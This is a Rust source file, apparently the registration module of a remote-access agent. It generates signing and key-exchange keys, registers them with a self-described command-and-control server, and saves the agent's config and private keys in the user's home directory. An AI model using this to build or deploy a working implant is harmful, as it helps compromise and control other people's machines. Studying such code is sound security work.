use crate::{config, Error};

use common::{
    api::{self, RegisterAgent},
    crypto,
};

use ed25519_dalek::{Keypair, PublicKey, Signature, Signer};
use rand::RngCore;
use std::path::PathBuf;
use std::{convert::TryInto, fs};
use x25519_dalek::{x25519, X25519_BASEPOINT_BYTES};

pub fn init(api_client: &ureq::Agent) -> Result<config::Config, Error> {
    let saved_agent_id = get_saved_agent_config()?;

    let conf = match saved_agent_id {
        Some(agent_id) => agent_id,
        None => {
            let conf = register(api_client)?;
            save_agent_config(&conf)?;
            conf
        }
    };

    Ok(conf)
}

/// This is the step required for the agent to register itself to the server by
/// sending its identity_public_key, public_prekey and public_prekey_signature.
///
/// Note: the long-term identity ed25519 keypair will be generated only once in
/// the lifetime of an agent. And x25519 prekey is used for key-exchange for jobs.
pub fn register(api_client: &ureq::Agent) -> Result<config::Config, Error> {
    let register_agent_route = format!("{}/api/agents", config::SERVER_URL);
    let mut rand_generator = rand::rngs::OsRng {};
    let identity_keypair: Keypair = ed25519_dalek::Keypair::generate(&mut rand_generator);

    let mut private_prekey = [0u8; crypto::X25519_PRIVATE_KEY_SIZE];
    rand_generator.fill_bytes(&mut private_prekey);

    let public_prekey: [u8; 32] = x25519(private_prekey.clone(), X25519_BASEPOINT_BYTES);
    // this is a necessary step to ensure it has been issued by the agent and not an adversary.
    let publlic_prekey_signature: Signature = identity_keypair.sign(&public_prekey);

    let register_agent = RegisterAgent {
        identity_public_key: identity_keypair.public.to_bytes(),
        public_prekey: public_prekey.clone(),
        public_prekey_signature: publlic_prekey_signature.to_bytes().to_vec(),
    };

    // Sending the registered data to C&C (command-and-control) server.
    let api_res: api::Response<api::AgentRegistered> = api_client
        .post(&register_agent_route.as_str())
        .send_json(ureq::json!(register_agent))?
        .into_json()?;

    if let Some(err) = api_res.error {
        return Err(Error::Api(err.message));
    }

    let client_public_key_bytes: Vec<u8> = base64::decode(config::CLIENT_IDENTITY_PUBLIC_KEY)?;
    let client_identity_public_key: PublicKey =
        ed25519_dalek::PublicKey::from_bytes(&client_public_key_bytes)?;

    let conf = config::Config {
        agent_id: api_res.data.unwrap().id,
        identity_public_key: identity_keypair.public,
        identity_private_key: identity_keypair.secret,
        public_prekey,
        private_prekey,
        client_identity_public_key,
    };

    Ok(conf)
}

fn get_saved_agent_config() -> Result<Option<config::Config>, Error> {
    let agent_id_file = get_agent_config_file_path()?;

    if agent_id_file.exists() {
        let agent_file_content = fs::read(agent_id_file)?;

        let serialized_conf: config::SerializedConfig =
            serde_json::from_slice(&agent_file_content)?;
        let conf = serialized_conf.try_into()?;
        Ok(Some(conf))
    } else {
        Ok(None)
    }
}

pub fn get_agent_config_file_path() -> Result<PathBuf, Error> {
    let mut home_dir = match dirs::home_dir() {
        Some(home_dir) => home_dir,
        None => return Err(Error::Internal("Error getting home directory".to_string())),
    };

    home_dir.push(config::AGENT_ID_FILE);

    Ok(home_dir)
}

fn save_agent_config(conf: &config::Config) -> Result<(), Error> {
    let agent_config_file = get_agent_config_file_path()?;
    let serialized_config: config::SerializedConfig = conf.into(); // thanks to <Into> from Conf
    let config_json = serde_json::to_string(&serialized_config)?;

    fs::write(agent_config_file, config_json.as_bytes())?;

    Ok(())
}
